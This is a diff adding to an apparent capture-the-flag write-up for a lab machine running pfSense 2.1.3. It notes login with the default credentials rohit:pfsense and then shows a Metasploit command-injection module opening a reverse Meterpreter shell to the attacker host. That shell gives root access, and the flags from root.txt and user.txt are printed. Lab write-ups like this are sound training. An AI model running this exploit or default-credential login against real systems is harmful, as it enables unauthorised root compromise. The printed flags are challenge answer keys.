@@ -51,3 +51,32 @@ password: company defaults
 
 Company defaults happen to be pfsense
 And so login with rohit:pfsense let's us in.
+
+=========================USER and ROOT !===============================
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.13:4444 
+[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
+[*] Payload uploaded successfully, executing
+[*] Sending stage (39282 bytes) to 10.10.10.60
+[*] Meterpreter session 2 opened (10.10.14.13:4444 -> 10.10.10.60:15400) at 2021-04-27 06:10:51 +0300
+[+] Deleted HdIGmGC
+
+meterpreter > shell
+Process 88053 created.
+Channel 0 created.
+whoami
+root
+cat /root/root.txt
+d08c32a5d4f8c8b10e76eb51a69f1a86
+cd /home
+ls
+.snap
+rohit
+cd rohit
+ls
+.tcshrc
+user.txt
+cat user.txt
+8721327cc232073b40d27d9c17e7348b
+
